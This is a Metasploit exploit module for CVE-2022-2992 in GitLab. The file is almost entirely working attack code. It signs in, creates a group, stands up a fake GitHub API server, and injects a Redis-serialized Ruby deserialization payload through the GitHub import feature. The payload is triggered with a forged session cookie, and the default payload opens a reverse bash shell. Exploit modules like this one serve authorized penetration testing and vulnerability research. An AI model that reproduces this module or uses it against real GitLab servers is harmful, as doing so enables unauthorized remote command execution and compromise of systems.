##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::RubyDeserialization
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HTTP::Gitlab

  attr_accessor :cookie

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Remote Command Execution via Github import',
        'Description' => %q{
          An authenticated user can import a repository from Github into Gitlab.
          One can try to import from an attacker's controller server which
          replies with a Redis' serialization protocol object in the nested
          default_branch making the Gitlab to cache this object on redis and
          the redis to deserialize it and trigger execute the payload.
        },
        'Author' => [
          'vakzz', # discovery
          'Heyder Andrade <https://infosec.exchange/@heyder>', # msf module
          'RedWay Security <https://infosec.exchange/@redway>', # PoC
        ],
        'References' => [
          ['URL', 'https://hackerone.com/reports/1679624'],
          ['URL', 'https://github.com/redwaysecurity/CVEs/tree/main/CVE-2022-2992'], # PoC
          ['CVE', '2022-2992']
        ],
        'DisclosureDate' => '2022-10-06',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'DefaultOptions' => { 'WfsDelay' => 20 },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
        OptString.new('NGROK_URL', [true, 'The Ngrok tunnel url', '/'])
      ]
    )
  end

  def group_name
    @group_name ||= Rex::Text.rand_text_alpha(8..12)
  end

  def api_token
    @api_token ||= gitlab_create_access_token
  end

  def session_id
    @session_id ||= Rex::Text.rand_text_alpha_lower(4)
  end

  def redis_payload(cmd)
    serialized_payload = generate_ruby_deserialization_for_command(cmd)
    gitlab_session_id = "session:gitlab:#{session_id}"
    "ggg\r\n*3\r\n$3\r\nset\r\n$#{gitlab_session_id.size}\r\n#{gitlab_session_id}\r\n$#{serialized_payload.size}\r\n" + serialized_payload
  end

  def check
    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie

    vprint_status('Trying to get the gitlab version')

    version = Rex::Version.new(gitlab_version)

    return CheckCode::Safe("Detected Gitlab version #{version} which is not vulnerable") unless (
      version.between?(Rex::Version.new('11.10'), Rex::Version.new('15.1.6')) ||
      version.between?(Rex::Version.new('15.2'), Rex::Version.new('15.2.4')) ||
      version.between?(Rex::Version.new('15.3'), Rex::Version.new('15.3.2'))
    )

    # TODO: - report this
    return CheckCode::Vulnerable("Detected Gitlab version #{version} which is vulnerable")
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e
    return CheckCode::Unknown("#{e.class} - #{e.message}")
  end

  def cleanup
    super
    return unless @import_id

    gitlab_delete_group(@group_id, api_token)
    gitlab_revoke_access_token(api_token)
    gitlab_sign_out
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e
    print_error("#{e.class} - #{e.message}")
  end

  def exploit
    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_request_uri(cli, req)
        end,
        'Path' => '/'
      }
    })
    execute_command(payload.encoded)
  rescue Timeout::Error => e
    fail_with(Failure::TimeoutExpired, e.message)
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")
    # due the AutoCheck mixin and the keep_cookies option the cookie is already set
    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
    vprint_status("Session ID: #{session_id}")
    vprint_status("Creating group #{group_name}")
    # We need group id for the clenaup method
    @group_id = gitlab_create_group(group_name, api_token)
    fail_with(Failure::UnexpectedReply, 'Failed to create a new group') unless @group_id
    @redis_payload = redis_payload(cmd)
    # import a repository from github
    vprint_status('Importing a repository from github')
    @import_id = gitlab_import_github_repo(group_name, datastore['NGROK_URL'], api_token)
    sleep(5)
    # execute the payload
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, group_name),
      'method' => 'GET',
      'keep_cookies' => false,
      'cookie' => "_gitlab_session=#{session_id}"
    })
  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e
    fail_with(Failure::Unknown, "#{e.class} - #{e.message}")
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, req)
    super
    # print_status("on_request_uri called: #{req.inspect}")
    headers = { 'Content-Type' => 'application/json' }
    data = {}.to_json
    if req.uri.match(%r{/\w+/public.git/info/refs})
      data = "001e# service=git-upload-pack\n00000154b5e17b851383bcee012364d0df7b67a3c4797b73 HEAD\x00multi_ack thin-pack side-band side-band-64k ofs-delta shallow deepen-since deepen-not deepen-relative no-progress include-tag multi_ack_detailed allow-tip-sha1-in-want allow-reachable-sha1-in-want no-done symref=HEAD:refs/heads/main filter object-format=sha1 agent=git/github-g04ce7e352669\n003db5e17b851383bcee012364d0df7b67a3c4797b73 refs/heads/main\n0000"
      headers.merge!('Content-Type' => 'application/x-git-upload-pack-advertisement')
    elsif req.uri.match(%r{/\w+/public.git/git-upload-pack})
      data = <<~EOF
        0008NAK\n0023\x02Enumerating objects: 3, done.\n0022\x02Counting objects:  33% (1/3)\r0022\x02Counting objects:  66% (2/3)\r0022\x02Counting objects: 100% (3/3)\r0029\x02Counting objects: 100% (3/3), done.\n0265\x01PACK\x00\x00\x00\x02\x00\x00\x00\x03\x9a(x\x9cmR\xcbn\xa3@\x00\xbb\xf3\x15sG\xdb0\xbc\x91\xdaUg(\x05\xb6\xc9\x00i\x08io<\xc20\x84Gx\x87|\xfdv\xb7\xd7\xfaf\xcb\x96,\xd9c\x7f>\x83L\xceu\xa8\xa5\x9a\x90\xe6\xb9\x9e\xe7R\x92&r\x96f\x86b\x18\x8a.\xe6\xb1\n\xb3\x14\x8a9\xe4\xe2i,\xda\x1eD\xac\xaaX\\\x03\xdc.\x15k(x\\\xbe\x84\xe7%\xf9\xa6\x0f\xac\xc9\xdb\xdf\x00\xaa*\x94d(+*\xe0\xa1 \x08\\\xda\xd65\x1b\xc7s\x0fl6:S\x02\x1e\x9b\xb6?_\xab\xf5\x99\xb2\xb1\x98\x92\x87/\xc3\x0f1z\xa5\x03\xa3\xe0\xd7?`\xcbv\t\xf0m\x1f\xbc\xbb6A\x87po\xfd\xd79\xc0\x81e\xc0)F\x08\x9b\x08\x058\xf8Sb\xaa\x07\xe6\x1e\xbfiE){\xb3\xd4\xbb\x0bB3\r\\\xe4t\xcb\x1b\xcd\xd96W\xeac\xfe\x11\xdb\x05\x9f\xbdB\xbe\xe3\x80"\xd2H\x8f\x8e\xcc\xa4:\xf9\xdct\xc3\x88Y\xa8_.\xa7tht\xb5B\xa8\x13\x96\n\x1f\xe4jt\xe1\xea\xf9\x1f\xbcVf7\x85\x85\xe3\xb1\xd9\x96\xedHt\x0e\xd8\xd7y\x8b\xe4\xcfY\xd4\x93\xbb\xb8\xf9\x14=\xff\x10D)\x8e\x87Lz\xado\xeb2m2\xe8\xf4W\x8a\x02\xc2\xf6u\x946\xcb\xf5\xd4C\xcb\xb6\xadN%\xd3]\xe5@:%\x1a\x81\xea\xbe\xc6\xd4\x98\x1a\xf1\x8f\xb4+w\x06,nf\xca*\x1a\x94+\xf3\xa2\xb5U\xc5\xa3\x7f\xaaH\x1b_\xc2;<\x1en\x1bB\x19\xcd\xb2\xc5\xe0\'\x0e\x08\xda\x18#\'\xf7/\xba\xb5\xa7\x86\xe0\xf1\xb50k\xc7\x9btK\xca\xb3I\x82\xa2\x08\xe7]%\r}7\xedb=\x0cO\xd8\x94}{%\xfd\xee\xfdP\xdd\xed\xac\xfe\xea\x80\xcd\x8b\xcb\xb7y\xbd\xf3\xb2\xaaQ\xd8@\xf8\xed\xac+\x92_F\xd2^v\x9c\xd4\x14\xca\"\xac?\xae\x9b;I\xf9\xd5|K$\xcd\xec^\xc6\xc0\tm\xabFO\x1cx\xf2\x02\xe9\x95\xfb\xde\xcc"/?/\xc6\xb9\r\x1bY\\\x81\xefc\xfc\x05\xc7\xd4\xcb\x13\xa5\x02x\x9c340031Q\x08rut\xf1u\xd5\xcbMa8\x96\x983g{\xab\xdfn\x86\xe6\xe7\xc2\xd9fo\x9f~\x7f\x94\xe5\x04\x00\xe1!\x0e\xe6=x\x9cSV((M\xca\xc9L\xe6JLL\xe4\x02\x00\x1c^\x03\xfa\xd2_\xcc\xa1\xa6\x81\xa3\xb6\xeeSL\x96\t\x0c\xb4\xf8\xb7>\xa90006\x01\xf8003a\x02Total 3 (delta 0), reused 0 (delta 0), pack-reused 0\n0000
      EOF
      headers.merge!({ 'Content-Type' => 'application/x-git-upload-pack-result' })
    elsif req.uri.match(%r{(/api/v3)?/repositories/(\w{1,20})})
      name = Rex::Text.rand_text_alpha(8..12)
      id = Regexp.last_match(1)
      data = {
        id: id,
        name: name,
        full_name: "#{name}/name",
        clone_url: "#{datastore['NGROK_URL']}/#{name}/public.git"
      }.to_json
    elsif req.uri.match(%r{/api/v3/repos/\w+/\w+})
      data = {
        'default_branch' => {
          'to_s' => {
            'bytesize' => 3,
            'to_s' => @redis_payload
          }
        }
      }.to_json
    elsif req.uri.starts_with?('/api/v3/rate_limit')
      headers.merge!({
        'X-RateLimit-Limit' => '100000',
        'X-RateLimit-Remaining' => '100000'
      })
    end
    send_response(cli, data, headers)
  end

end
